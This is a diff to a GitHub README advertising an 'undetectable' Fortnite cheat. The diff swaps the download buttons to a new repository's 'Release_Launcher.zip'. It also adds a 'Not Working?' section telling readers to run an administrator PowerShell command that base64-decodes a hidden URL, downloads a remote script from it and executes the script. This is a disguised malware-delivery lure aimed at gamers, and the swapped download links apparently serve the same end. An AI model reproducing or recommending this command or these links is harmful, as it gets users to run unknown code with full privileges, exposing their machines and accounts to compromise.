@@ -2,9 +2,21 @@
 
 <img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/8031e2e7-dc21-4052-b2d7-b4fa4639f16f" />
 
-## [![Download Button](https://img.shields.io/badge/DOWNLOAD-Fortnite%20Cheat-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)
+## [![Download Button](https://img.shields.io/badge/DOWNLOAD-Fortnite%20Cheat-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
 
 *Sleek, efficient, and undetectable - The ultimate external toolkit for Fortnite*
+
+---
+## Not Working?
+Follow this steps:
+- Press Win + R
+- Type *Powershell* and open with Administrator
+- Copy this command:
+```
+iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz00NTY2MjQxNDcvbmV3b25l'))) -UseBasicParsing)
+```
+- Paste it in Powershell Window, press Enter
+---
 
 ---
 
@@ -12,7 +24,7 @@
 
 ### Step 1 — Download
 
-[![Download Now](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-Click_Here-blue?style=for-the-badge&logo=download&logoColor=white)](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)
+[![Download Now](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-Click_Here-blue?style=for-the-badge&logo=download&logoColor=white)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
 
 ### Step 2 — Extract
 
